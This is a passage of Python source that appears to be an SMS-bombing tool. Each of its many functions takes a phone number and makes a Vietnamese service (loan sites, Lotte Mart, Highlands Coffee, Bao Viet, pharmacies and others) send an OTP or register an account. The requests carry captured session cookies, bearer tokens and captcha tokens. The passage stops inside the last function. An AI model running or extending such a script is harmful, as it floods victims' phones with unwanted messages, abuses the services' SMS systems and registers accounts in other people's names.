    '_gid': 'GA1.2.557208002.1720622172',
    '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
    '_ym_isad': '2',
    '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
    '_ym_visorc': 'w',
    'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.1882430469.1720102726',
    'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_png_client': 'false',
    'ec_png_client_utm': 'null',
    'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': 'null',
    'ec_etag_client': 'false',
    'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_etag_client_utm': 'null',
    '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
    '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
    'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'client': 'false',
    'client_utm': 'null',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
    'origin': 'https://vietloan.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vietloan.vn/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
    '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
}

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
def dkimu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'name': 'hà khải',
    'phone': phone,
    'password': 'Vjyy1234@',
    'confirm_password': 'Vjyy1234@',
    'firstname': None,
    'lastname': None,
    'verify_otp': 0,
    'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'email': 'dđ@gmail.com',
    'birthday': '2006-02-13',
    'accept_the_terms': 1,
    'receive_promotion': 1,
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data)
def otpmu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'phone': phone,
    'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
    'source': 'web_consumers',
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)
def lote(phone):
    cookies = {
    '__Host-next-auth.csrf-token': '2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6',
    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    '_gcl_au': '1.1.2136712951.1720299022',
    '_ga': 'GA1.1.164372556.1720299023',
    '_fbp': 'fb.1.1720299024438.549668172235070425',
    '_ga_6QLJ7DM4XW': 'GS1.1.1720299022.1.1.1720299051.31.0.0',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '__Host-next-auth.csrf-token=2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.2136712951.1720299022; _ga=GA1.1.164372556.1720299023; _fbp=fb.1.1720299024438.549668172235070425; _ga_6QLJ7DM4XW=GS1.1.1720299022.1.1.1720299051.31.0.0',
    'origin': 'https://www.lottemart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'username': phone,
    'case': 'register',
}

    response = requests.post(
    'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def upos(phone):
    url = f"https://upos.vn/vn/home/send_brandname_otp/{phone}"
    response = requests.get(url)
def foodmap1(phone):
    url = f"https://foodmap.asia/register/check-phone/send-otp/{phone}/null/false/zalo"
    response = requests.get(url)
def thuongdo(phone):
    url = f"https://api-client.hangve.com/api/auth/reset-password/by-phone/{phone}"
    response = requests.get(url)
def unicar(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://unicar.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://unicar.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': phone,
        'app': 'xoomw',
        'v': 'w36.15.2',
    }

    response = requests.post('https://api.unicar.vn/uauth/login_phone', headers=headers, json=json_data)
def highlands(phone):
    cookies = {
        '.diadiem.Session': 'CfDJ8PoFpWVp%2FpdMhR9HbDRDTjvQ3P9oiWq7sLAZDIAEIJQkq1BCCexcaXOOw8h2osc2O%2B%2BbBmX%2F9TgsuKk35ZhirG%2B%2BZ0OyTD6CoQLnnRPN3I%2BtfIDD%2BJr70J8%2F9XnoUu0%2B%2BkcY2YLmrP0lKTsNgRvIhNFewRV0rfR7gdO7zje9PxnU',
        'route': '1734771032.298.37.687218|d5b38695e274be05122762aeb7f81e07',
    }

    headers = {
        'Host': 'api-app.highlandscoffee.com.vn',
        # 'Cookie': '.diadiem.Session=CfDJ8PoFpWVp%2FpdMhR9HbDRDTjvQ3P9oiWq7sLAZDIAEIJQkq1BCCexcaXOOw8h2osc2O%2B%2BbBmX%2F9TgsuKk35ZhirG%2B%2BZ0OyTD6CoQLnnRPN3I%2BtfIDD%2BJr70J8%2F9XnoUu0%2B%2BkcY2YLmrP0lKTsNgRvIhNFewRV0rfR7gdO7zje9PxnU; route=1734771032.298.37.687218|d5b38695e274be05122762aeb7f81e07',
        'content-type': 'application/json',
        'accept': 'application/json',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjBhYmUxZmFlLWI4YzUtNDhmYy1iYzhjLTVlOTA5ODNjY2VmNyJ9.eyJVc2VyR3VpZCI6IkN1c3RvbWVyLzIiLCJEZXZpY2VHdWlkIjoiRGV2aWNlLzQiLCJMb2NhdGlvbkd1aWQiOiJMb2NhdGlvbi80IiwiS2V5RGV2aWNlIjoiRTJWQy1KTUwzLTRXWFEiLCJEZXZpY2VUeXBlIjoiMSIsIm5iZiI6MTczNDc3MTAyMCwiZXhwIjoxNzM3OTY3ODIwLCJpYXQiOjE3MzQ3NzEwMjAsImlzcyI6Imh0dHBzOi8vYXBpLWFwcC5oaWdobGFuZHNjb2ZmZWUuY29tLnZuIiwiYXVkIjoiaHR0cHM6Ly9hcGktYXBwLmhpZ2hsYW5kc2NvZmZlZS5jb20udm4ifQ.s1f5aqFBATZGDqgA69uFYle-UsEH_4mqdb8-3euaRXk',
        'x-auth-checksum': '14129e5f51e48ae7ff9d12116c80e1d33bf2c56e355412683ca33c17732e6012',
        'x-auth-timestamp': '1734771031306',
        'accept-language': 'vi',
        'x-auth-signature': 'b75377e9453f0644fce99ba40305dd1cf3371438cd03f36e92c4da19f3ca7493',
        'user-agent': 'PendoGO/4.1.15 (com.vti.highlands; build:1; iOS 15.8.2) Alamofire/5.9.1',
        'x-auth-nonce': '1734771031306155',
        'x-auth-devicecode': 'E2VC-JML3-4WXQ',
    }

    json_data = {
        'UserAccount': phone,
    }

    response = requests.post(
            'https://api-app.highlandscoffee.com.vn/api/v3/authentication/otp/send',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
def h5vay(phone):
    cookies = {
        'JSESSIONID': '44F3DE8B56B8D4A9A50B52BD75F00723',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Language': 'vn',
        'Content-Type': 'application/json',
        # 'Cookie': 'JSESSIONID=44F3DE8B56B8D4A9A50B52BD75F00723',
        'Origin': 'https://h5.govaydong.com',
        'Referer': 'https://h5.govaydong.com/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'appcodename': 'Mozilla',
        'appname': 'Netscape',
        'appversion': '5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'channel': '',
        'deviceType': 'h5',
        'h': '2400.75',
        'platform': 'Linux armv81',
        'screenresolution': '1080.75,2400.75',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'system': 'android',
        'vendor': 'Google Inc.',
        'w': '1080.75',
    }

    json_data = {
        'phone': phone,
        'type': 2,
        'timestamp': 1737416615579,
        'referrer': 'utm_source=null',
        'af_prt': None,
        'sign': '0f656af82eb1da33221a06d1171db265',
        'appversion': '1.0.0',
        'channel': '1',
        'app_version': '1.0.0',
        'version': '1.0.0',
        'imei': '24313ac76414f67ee311fceb02009c11',
        'uuid': '24313ac76414f67ee311fceb02009c11',
        'pkg_name': 'com.qcloan.vay24h5',
    }

    response = requests.post('https://h5.govaydong.com/api/register/app/sendSms', cookies=cookies, headers=headers, json=json_data)        
def gas40(phone):
    cookies = {
        'Gas4.0UserId': '51f88088-12b1-41f0-9416-4fccd1743b7e',
        '__Gas4.0UserRegion': 'CANTHO',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        # 'cookie': 'Gas4.0UserId=51f88088-12b1-41f0-9416-4fccd1743b7e; __Gas4.0UserRegion=CANTHO',
        'origin': 'https://gas40.com',
        'priority': 'u=1, i',
        'referer': 'https://gas40.com/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    params = {
        'phone': phone,
    }

    response = requests.get('https://ecom.viettechsmart.com:5020/api/Calls/OTP', params=params, cookies=cookies, headers=headers)
def finzone(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'captchatoken': '03AFcWeA6tooBO3Q-Vcug2TPt9h9-HZCR3zjxarHr68OSGc5xWsvVPH6bPDS7TnH3uga1j3UCEXvwBGl8crFIj3Z1UC3206VTZazHZCdIGXQ8CiPKSvhhw_Q4x1mQ5uzAoWgKXDS5_NjcmEcy3bWMwEFn3plfOMCwg2X0wyTEba7fWgel4ELLOjwDPDclLYulPkD_OjaoeXDSMJt9Nzk8_VrCmKYYVLVdMSImo2VsarVE53LW3SJ6_fk5G6A8lGpfz-i9M2zdLVjg7pEOJ7uwzi56Kz8yFxz92j5SZjmqk7S3NsbuV8DwEvraKu1rAMiNM0IjS5BrDxX41eY_iBxUJGkpj0JlMcISsJEhq39tpHF9-ZASrg_GIkhWPiCHQYiGcWG2rDbTi_AuC9vo787OOO-uGZjETA9Y9UEbKRcb5h0wgo3ufjbmRNM-JSU7FKlWD7ssiTqm5IuM-MOdkZ4Yg_78zF1ZwiOWbXPYZjL6jkG_QG2QSE6MNWlQE_jTcy_w19fcec2KhuU3Z8C_8aAA94KdLWzO3KvM16FoSm8rTdYI0D7XTYj2-eSnCTO-PjadPBKlhvrV87kxWRNh71xO-wAEwiIcdqYv0whcZ5RDt6He5svhId9m6rhF2n6THcjfPz28162wse54GE1nOhBjgm6gYMeLLJ3qyE6ISM5M7GNAjSz0T7n1qCq9wK30E708AulFNizab1NKIvft68g0M-O6sX-iRvwSGF-uvv2g919K0_dFiMVwVV1hq4ySASXFqBlDZL5U7EHD7N56pQ54zy6CdP25I7W_SjoKUHHyVxGasC4o0surkxEXFAIZiIbtv-6JH89RbsURBtiZVcY6S3c2PiF2AXNR-kK1mi_xbRcI5hbyPbe_31S2XylFGFyNF8nhjmgXCRfo6ddzSPODPGp7DEexKg1abVQ',
        'content-type': 'application/json',
        'origin': 'https://finzone.vn',
        'priority': 'u=1, i',
        'referer': 'https://finzone.vn/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone_number': phone,
        'loan_period': 6,
        'loan_purpose': 'consumer_loan',
        'expected_amount': 20000000,
        'device_id': '26ebfc3ef2750940c153c9f8c15d126c.1e1606bcd85a88bf6db102db745a6885',
        'tracking_params': {
            'formId': 'a23ca2e8-e2d0-4b21-a438-2ef51245872c',
        },
        'device_info': {
            'os': 'unknown',
            'browser': 'unknown',
        },
        'consent_id': '425edf86-2fdc-4fb1-b44c-eddf4868e92b',
    }

    response = requests.post('https://api.finzone.vn/upl/new', headers=headers, json=json_data)
def pharmart1(phone):
    cookies = {
        'bppsession2021': '9m74ec12o7n3rodrb4chpg0vscl3ol0m',
        'isAT': '0',
        '_gcl_au': '1.1.850921550.1737988343',
        '_ga': 'GA1.1.1093851254.1737988343',
        '_tt_enable_cookie': '1',
        '_ttp': '4D0CKcX7-DGcl03mbLdWH9hL4aW.tt.1',
        '_clck': 'w96d30%7C2%7Cfsx%7C0%7C1853',
        '_clsk': '1bgzv52%7C1737988345477%7C1%7C1%7Cq.clarity.ms%2Fcollect',
        '_ga_15NTZ9D0S2': 'GS1.1.1737988343.1.1.1737988464.60.0.0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'bppsession2021=9m74ec12o7n3rodrb4chpg0vscl3ol0m; isAT=0; _gcl_au=1.1.850921550.1737988343; _ga=GA1.1.1093851254.1737988343; _tt_enable_cookie=1; _ttp=4D0CKcX7-DGcl03mbLdWH9hL4aW.tt.1; _clck=w96d30%7C2%7Cfsx%7C0%7C1853; _clsk=1bgzv52%7C1737988345477%7C1%7C1%7Cq.clarity.ms%2Fcollect; _ga_15NTZ9D0S2=GS1.1.1737988343.1.1.1737988464.60.0.0',
        'origin': 'https://www.pharmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.pharmart.vn/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        'type': 'sms',
    }

    response = requests.post('https://www.pharmart.vn/send-otp', cookies=cookies, headers=headers, data=data)
def sigo(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://sigo.vn',
        'priority': 'u=1, i',
        'referer': 'https://sigo.vn/',
        'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'x-check': 'bheieicchbdeg',
    }

    json_data = {
        'UI_StartAt': 1748482271346,
        'UI_FirstID': 'mgfn_1748482222443',
        'AppName': 'sigoweb',
        'Url': 'https://sigo.vn/',
        'DocumentWidth': 1280,
        'MobilePhone': phone,
        'ActionType': 'register',
        'UI_TimezoneOffset': -420,
    }

    response = requests.post('https://api.sigo.vn/api/v1/Account/GetOTP', headers=headers, json=json_data)
def baoviet(phone):
    cookies = {
        'baoviet4u_cookie': 'f5ace1b697f7cb31bb209e1cc11258b7',
    }

    headers = {
        'Host': 'bvdr.baoviet.com.vn',
        # 'Cookie': 'baoviet4u_cookie=f5ace1b697f7cb31bb209e1cc11258b7',
        'secret': '042318',
        'accept': 'application/json',
        'user-agent': 'Baoviet Direct/6.9.17 (com.baoviet.bvgi.baoviet4u; build:3; iOS 17.4.1) Alamofire/4.9.1',
        'accept-language': 'vi;q=1.0',
    }

    params = {
        'userName': phone,
        'type': '1',
    }
    response = requests.get('https://bvdr.baoviet.com.vn/api/unauth/sendOTP_v3', params=params, cookies=cookies, headers=headers)
def truedoc(phone):
    headers = {
        'Host': 'mapi.aihealth.vn',
        'accept': 'application/json',
        'content-type': 'application/json; charset=utf-8',
        'x-auth-id': '9B1B13952BD9FF446AB569BBB49B3',
        'authorization': 'Bearer ',
        'postman-token': 'f3dc96f9-6287-46cb-9b93-7d69dfeca783,298d8d62-ed78-4b27-b614-182d047e15fa',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'AI_HEALTH/14 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN',
    }

    params = {
        'Phone': phone,
        'CountryCode': '84',
        'DeviceId': '5308E878-5785-4579-B17D-736E1E008E47',
        'UuidByKeychain': '5308E878-5785-4579-B17D-736E1E008E47',
        'GrantType': 'register_key',
    }
    response = requests.get('https://mapi.aihealth.vn/api/mobile/v1/sso/register/key', params=params, headers=headers)
def babilala(phone):
    headers = {
        'Host': 'api.babilala.vn',
        'phone': phone,
        'accept': '*/*',
        'lang': 'vi',
        'content-type': 'application/x-www-form-urlencoded',
        'x-unity-version': '2019.3.15f1',
        'user-agent': 'babilala/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }
    response = requests.post('https://api.babilala.vn/api/getOtp', headers=headers)
def vieclam24h(phone):
    headers = {
        'Host': 'api.mobile.vieclam24h.vn',
        'content-type': 'application/json',
        'accept': 'application/json, text/plain, */*',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjaGFubmVsX2NvZGUiOiJ2bDI0aCIsInVzZXIiOm51bGx9.a0POm2ZVRwetYs2QsMj0sRg8lZSSbKufX4sewqhAM5o',
        'app-version': '1.10.0',
        'app-name': 'VIECLAM24H-MOBILE-APP',
        'os': 'IOS',
        'accept-language': 'vi-VN,vi;q=0.9',
        'x-api-version': '1.0',
        'user-agent': 'Vieclam24h/1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'lang': 'vi',
        'os-version': '17.4.1',
    }

    json_data = {
        'type': 1,
        'mobile': phone,
    }
